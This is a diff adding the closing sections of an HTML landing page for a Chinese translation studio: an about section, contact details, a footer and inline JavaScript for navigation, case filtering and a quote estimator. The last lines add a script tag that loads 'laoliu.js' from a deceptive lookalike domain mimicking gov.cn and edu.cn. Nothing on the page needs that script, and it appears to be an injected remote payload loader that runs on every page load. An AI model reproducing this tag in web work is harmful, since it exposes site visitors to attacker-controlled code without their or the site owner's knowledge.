+  </section>
+
+  <!-- ========== 关于里番 ========== -->
+  <section id="about" aria-labelledby="s6">
+    <div class="wrap about">
+      <div>
+        <div class="kicker">ABOUT</div>
+        <h2 id="s6">关于里番</h2>
+        <p class="sec-desc" style="margin-bottom:1.75rem">里番是一支由语言与行业背景双重筛选的译员组成的本地化团队，专注把"翻译"这件事做到能直接交付、无需返工。</p>
+        <div class="features">
+          <div class="feat"><div class="ic">🎯</div><div><h3>按领域派单</h3><p>不做通译，每份稿件只交给有对应行业经验的译员。</p></div></div>
+          <div class="feat"><div class="ic">🧩</div><div><h3>术语可复用</h3><p>专属术语库与记忆库随项目沉淀，复稿效率与一致性同步提升。</p></div></div>
+          <div class="feat"><div class="ic">🔒</div><div><h3>交付可追责</h3><p>译员实名、流程留痕，附修改记录与质量说明，支持 NDA。</p></div></div>
+          <div class="feat"><div class="ic">🔁</div><div><h3>售后质保</h3><p>两轮免费修订，交付后 30 天内随时追加修改与格式调整。</p></div></div>
+        </div>
+      </div>
+      <aside class="contact">
+        <h2>联系里番</h2>
+        <p class="sec-desc">发一段需求，最快 30 分钟内给你回音与报价。</p>
+        <div class="ci"><div class="ic">✉️</div><div><b>邮箱</b><span>hello@lifan.example</span></div></div>
+        <div class="ci"><div class="ic">💬</div><div><b>微信</b><span>lifan_lang</span></div></div>
+        <div class="ci"><div class="ic">📍</div><div><b>所在地</b><span>江苏 宿迁 · 远程协作</span></div></div>
+        <div class="hours">回复时段：工作日 9:00–21:00 · 加急稿件 24 小时响应</div>
+      </aside>
+    </div>
+  </section>
+
+  <div class="wrap">
+    <div class="cta-band">
+      <h2>准备好开始你的项目了吗？</h2>
+      <p>把文件和要求发过来，里番会在 30 分钟内回复可用语种、交期与报价。</p>
+      <div class="hero-actions" style="justify-content:center">
+        <a href="#cases" class="btn btn-primary">免费估算报价</a>
+        <a href="#about" class="btn btn-ghost">了解里番团队</a>
+      </div>
+    </div>
+  </div>
+</main>
+
+<footer class="ft">
+  <div class="wrap">
+    <div class="ft-top">
+      <div class="ft-brand">
+        <b>里番翻译</b>
+        <p>把每一种语言，都译成本地人会说的话。专注翻译与本地化，交付可追责。</p>
+      </div>
+      <div><h4>服务</h4><ul>
+        <li><a href="#services">法律翻译</a></li>
+        <li><a href="#services">医学翻译</a></li>
+        <li><a href="#services">工程技术翻译</a></li>
+        <li><a href="#services">字幕与本地化</a></li>
+      </ul></div>
+      <div><h4>了解里番</h4><ul>
+        <li><a href="#process">服务流程</a></li>
+        <li><a href="#team">译员团队</a></li>
+        <li><a href="#cases">案例与报价</a></li>
+        <li><a href="#about">关于里番</a></li>
+      </ul></div>
+      <div><h4>联系</h4><ul>
+        <li><a href="mailto:hello@lifan.example">hello@lifan.example</a></li>
+        <li><a href="#about">微信 lifan_lang</a></li>
+        <li><a href="#about">江苏 宿迁</a></li>
+      </ul></div>
+    </div>
+    <div class="ft-bot">
+      <span>© <span id="yr">2026</span> 里番翻译工作室 · 专注翻译与本地化服务</span>
+      <span>本站为里番翻译官方介绍页</span>
+    </div>
+  </div>
+</footer>
+
+<a href="#top" class="top" id="topBtn" aria-label="回到顶部">↑</a>
+
+<script>
+(function(){
+  'use strict';
+
+  /* 年份 */
+  var yr = document.getElementById('yr');
+  if (yr) yr.textContent = new Date().getFullYear();
+
+  /* 导航阴影 + 回到顶部 */
+  var hd = document.getElementById('hd'), topBtn = document.getElementById('topBtn');
+  function onScroll(){
+    if (window.scrollY > 8) hd.classList.add('solid'); else hd.classList.remove('solid');
+    if (window.scrollY > 600) topBtn.classList.add('show'); else topBtn.classList.remove('show');
+  }
+  window.addEventListener('scroll', onScroll, { passive: true });
+  onScroll();
+
+  /* 移动菜单 */
+  var menuBtn = document.getElementById('menuBtn'), mmenu = document.getElementById('mmenu');
+  function toggleMenu(force){
+    var open = typeof force === 'boolean' ? force : !mmenu.classList.contains('open');
+    mmenu.classList.toggle('open', open);
+    menuBtn.setAttribute('aria-expanded', open ? 'true' : 'false');
+    mmenu.setAttribute('aria-hidden', open ? 'false' : 'true');
+    document.body.style.overflow = open ? 'hidden' : '';
+  }
+  menuBtn.addEventListener('click', function(){ toggleMenu(); });
+  mmenu.querySelectorAll('a').forEach(function(a){
+    a.addEventListener('click', function(){ toggleMenu(false); });
+  });
+  document.addEventListener('keydown', function(e){
+    if (e.key === 'Escape' && mmenu.classList.contains('open')) toggleMenu(false);
+  });
+
+  /* 案例筛选 */
+  var tabs = document.querySelectorAll('.tab'), grid = document.getElementById('caseGrid');
+  tabs.forEach(function(t){
+    t.addEventListener('click', function(){
+      tabs.forEach(function(x){ x.setAttribute('aria-selected', 'false'); });
+      t.setAttribute('aria-selected', 'true');
+      var cat = t.getAttribute('data-cat');
+      grid.querySelectorAll('.case').forEach(function(c){
+        var show = cat === 'all' || c.getAttribute('data-cat') === cat;
+        c.style.display = show ? '' : 'none';
+      });
+    });
+  });
+
+  /* 报价估算 */
+  var form = document.getElementById('quoteForm');
+  function calc(){
+    var lang = parseFloat(document.getElementById('qLang').value);
+    var type = parseFloat(document.getElementById('qType').value);
+    var words = parseInt(document.getElementById('qWords').value, 10) || 0;
+    var out = document.getElementById('qOut');
+    if (words < 100) { out.innerHTML = '字数太少啦，最少 100 字起译，可直接联系里番询价。'; return; }
+    var lo = Math.round(words * lang * type * 0.9);
+    var hi = Math.round(words * lang * type * 1.1);
+    var days = Math.max(1, Math.ceil(words / 3000));
+    out.innerHTML = '参考价：<b>¥' + lo.toLocaleString() + ' – ¥' + hi.toLocaleString() + '</b> 起 · 交期约 <b>' + days + '–' + (days + 1) + ' 个工作日</b>';
+  }
+  ['qLang','qType','qWords'].forEach(function(id){
+    document.getElementById(id).addEventListener('input', calc);
+    document.getElementById(id).addEventListener('change', calc);
+  });
+  calc();
+  form.addEventListener('submit', function(e){
+    e.preventDefault();
+    calc();
+    var v = encodeURIComponent('您好，我想询价：' + document.getElementById('qLang').selectedOptions[0].text + ' / ' + document.getElementById('qWords').value + ' 字');
+    window.location.href = 'mailto:hello@lifan.example?subject=' + v;
+  });
+
+  /* 当前区块高亮导航 */
+  var links = document.querySelectorAll('.navlinks a');
+  var secs = [];
+  links.forEach(function(a){
+    var el = document.querySelector(a.getAttribute('href'));
+    if (el) secs.push({ link: a, el: el });
+  });
+  function spy(){
+    var pos = window.scrollY + 120, cur = null;
+    secs.forEach(function(s){ if (s.el.offsetTop <= pos) cur = s.link; });
+    links.forEach(function(a){ a.style.background = ''; a.style.color = ''; });
+    if (cur) { cur.style.background = 'var(--brand-soft)'; cur.style.color = 'var(--brand-2)'; }
+  }
+  window.addEventListener('scroll', spy, { passive: true });
+  spy();
+})();
+</script>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+</body>
+</html>
